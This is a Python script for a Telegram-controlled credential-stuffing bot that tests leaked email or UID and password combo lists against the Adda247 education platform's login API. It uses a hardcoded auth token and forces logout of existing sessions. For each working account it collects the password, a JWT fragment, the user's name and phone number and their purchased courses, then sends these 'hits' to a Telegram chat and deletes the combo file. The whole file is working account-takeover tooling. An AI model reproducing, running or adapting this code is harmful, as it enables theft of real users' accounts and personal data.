import requests
import uuid
import json
import os
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from functools import partial

# --- CONFIG ---
MAX_THREADS = 3
TIMEOUT = 10
DELAY = 0.2
PAGE_SIZE = 20
SRC = "aweb"
X_AUTH_TOKEN = "fpoa43edty5"

USER_API = "https://userapi.adda247.com"
STORE_API = "https://store.adda247.com"

print_lock = threading.Lock()
progress_lock = threading.Lock()

# --- HELPERS ---
def parse_line(line):
    """Find identifier FIRST, password AFTER"""
    original = line.strip()
    
    if not original or original.startswith(('#', '//')):
        return None, None
    
    # STEP 1: Find EMAIL
    email_pattern = r'([\w\.\-\+]+@[\w\.\-]+\.\w+)'
    email_match = re.search(email_pattern, original)
    
    if email_match:
        email = email_match.group(1)
        after_pos = email_match.end()
        remainder = original[after_pos:].strip()
        pwd = re.sub(r'^[:|\s,;\\]+', '', remainder).strip()
        if pwd and len(pwd) >= 1:
            return email, pwd
        return None, None
    
    # STEP 2: Find 10-11 digit UID
    uid_pattern = r'\b(\d{10,11})\b'
    uid_match = re.search(uid_pattern, original)
    
    if uid_match:
        uid = uid_match.group(1)
        after_pos = uid_match.end()
        remainder = original[after_pos:].strip()
        pwd = re.sub(r'^[:|\s,;\\]+', '', remainder).strip()
        if pwd and len(pwd) >= 1:
            return uid, pwd
        return None, None
    
    # STEP 3: Fallback
    for delim in [':', '|', ',', ';']:
        if delim in original:
            parts = [p.strip() for p in original.split(delim) if p.strip()]
            if len(parts) >= 2:
                pwd = parts[-1]
                identifier = parts[-2]
                if re.match(email_pattern, identifier) or re.match(uid_pattern, identifier):
                    return identifier, pwd
    
    return None, None

def headers(csrf=None, lt=None, jwt=''):
    h = {'accept':'*/*','content-type':'application/json',
         'origin':'https://www.adda247.com','referer':'https://www.adda247.com/',
         'cp-origin':'11','dname':'Chrome on Windows Desktop','login_type':'1',
         'sec-ch-ua':'"Chromium";v="146"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"',
         'sec-fetch-mode':'cors','user-agent':'Mozilla/5.0',
         'x-auth-token':X_AUTH_TOKEN,'x-jwt-token':jwt}
    if csrf: h['x-csrf-token']=csrf
    if lt: h['login_token']=lt
    return h

def get_csrf(s):
    try:
        r = s.get(f"{USER_API}/csrf/token?src={SRC}", headers=headers(), timeout=TIMEOUT)
        if r.status_code == 200:
            d = r.json()
            if d.get('success') and d.get('data'):
                return d['data']
    except:
        pass
    return None

def login(s, csrf, identifier, pwd):
    url = f"{USER_API}/v2/login?src={SRC}"
    lt = str(uuid.uuid4())
    h = headers(csrf, lt)
    is_email = '@' in identifier
    payload = {
        "email" if is_email else "userId": identifier,
        "providerName": "email" if is_email else "uid",
        "sec": pwd
    }
    try:
        r = s.post(url, headers=h, json=payload, timeout=TIMEOUT)
        if r.status_code != 200:
            return None, None, None
        d = r.json()
        jwt = d.get('data',{}).get('jwtToken') or d.get('data',{}).get('jwtTokenNew') or d.get('jwtToken')
        if jwt and d.get('success'):
            return jwt, d.get('data',{}).get('userInfo') or d.get('userInfo'), None
        if d.get('alreadyLoggedIn'):
            return None, None, d.get('loginToken')
    except:
        pass
    return None, None, None

def force_logout(s, csrf, lt):
    url = f"{USER_API}/forceLogout?src={SRC}"
    h = headers(csrf, lt)
    try:
        r = s.post(url, headers=h, data='', timeout=TIMEOUT)
        if r.status_code == 200:
            d = r.json()
            if d.get('success') and d.get('data'):
                jwt = d['data'].get('jwtToken') or d['data'].get('jwtTokenNew')
                if jwt:
                    return jwt, d['data'].get('userInfo')
    except:
        pass
    return None, None

def get_batches(s, jwt):
    url = f"{STORE_API}/api/v2/ppc/package/purchased"
    h = headers(jwt=jwt)
    h['Authorization'] = f'Bearer {jwt}'
    try:
        r = s.get(url, headers=h, params={'pageNumber':0,'pageSize':PAGE_SIZE,'src':SRC}, timeout=TIMEOUT)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def fmt_batch(p):
    return {
        'name': p.get('packageName') or p.get('name') or p.get('title') or 'N/A',
        'id': p.get('packageId') or p.get('id') or p.get('sku') or 'N/A',
        'price': f"₹{p.get('sellingPrice') or p.get('price') or p.get('amount') or 0}",
        'status': p.get('status') or p.get('packageStatus') or 'N/A',
        'valid': p.get('validTill') or p.get('expiryDate') or p.get('validity') or 'N/A'
    }

# --- BOT LOGIC ---
def check_account(line, bot, chat_id, hits_list, state, total_lines):
    identifier, pwd = parse_line(line)
    if not identifier or not pwd:
        with print_lock:
            state['checked'] += 1
        return

    s = requests.Session()
    jwt = None
    user = None
    
    try:
        csrf = get_csrf(s)
        if csrf:
            jwt, user, lt = login(s, csrf, identifier, pwd)
            if not jwt and lt:
                jwt, user = force_logout(s, csrf, lt)
        
        if not jwt:
            with print_lock:
                state['checked'] += 1
            return
        
        batches = get_batches(s, jwt)
        
        if batches:
            pkgs = batches.get('data', [])
            if isinstance(pkgs, dict):
                pkgs = pkgs.get('content', pkgs.get('packages', []))
            
            if pkgs:
                with print_lock:
                    state['hits'] += 1
                    state['checked'] += 1
                    
                    # DETAILED FORMAT
                    hit_text = "📱 *APP NAME : ADDA247*\n"
                    hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                    hit_text += f"🎯 *HIT* | {identifier}\n"
                    hit_text += f"📧 *{'Email' if '@' in identifier else 'UID'} :* `{identifier}`\n"
                    hit_text += f"🔑 *Password :* `{pwd}`\n"
                    hit_text += f"🎫 *JWT :* `{jwt[:50]}...`\n"
                    
                    if user:
                        hit_text += f"👤 *Name :* {user.get('name','N/A')}\n"
                        hit_text += f"📱 *Phone :* `{user.get('phone','N/A')}`\n"
                    
                    hit_text += f"📦 *Batches :* {len(pkgs)}\n"
                    hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                    
                    for i, p in enumerate(pkgs, 1):
                        b = fmt_batch(p)
                        hit_text += f"\n*{i}. {b['name']}*\n"
                        hit_text += f"   🪪 *ID :* `{b['id']}`\n"
                        hit_text += f"   💰 *Price :* {b['price']}\n"
                        hit_text += f"   📊 *Status :* {b['status']}\n"
                        hit_text += f"   ⏰ *Valid Till :* {b['valid']}\n"
                    
                    hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                    
                    hits_list.append(hit_text)
                    
                    # Update progress (5 second rule)
                    update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines, state)
            else:
                with print_lock:
                    state['checked'] += 1
        else:
            with print_lock:
                state['checked'] += 1
    
    except Exception as e:
        with print_lock:
            state['checked'] += 1
    
    finally:
        s.close()

def update_progress(bot, chat_id, msg_id, hits, checked, total, state):
    """Update progress only every 5 seconds"""
    current_time = time.time()
    
    # Check if 5 seconds have passed since last update
    if current_time - state.get('last_update', 0) >= 5:
        with progress_lock:
            # Double check inside lock
            if current_time - state.get('last_update', 0) >= 5:
                try:
                    if total > 0:
                        progress_percent = int((checked / total) * 10)
                        bar = "■" * progress_percent + "▢" * (10 - progress_percent)
                    else:
                        bar = "■■▢▢▢▢▢"
                    
                    progress_text = f"""╭───☀ 𝖢𝖧𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
╰─── 𝐀𝐝𝐝𝐚𝟐𝟒𝟕 𝐁𝐨𝐭 ───╯"""
                    
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
                    state['last_update'] = current_time
                except:
                    pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id, 'last_update': 0}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Final File
    final_filename = "adda247_hit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        time.sleep(2)
        try:
            with open(final_filename, "rb") as f:
                bot.send_document(chat_id, f, caption=f"✅ {platform_name} Valid Hits ({state['hits']})")
        except:
            pass
        
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        try:
            bot.send_message(chat_id, "❌ No valid hits found.")
        except:
            pass

    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    if os.path.exists(combo_file):
        os.remove(combo_file)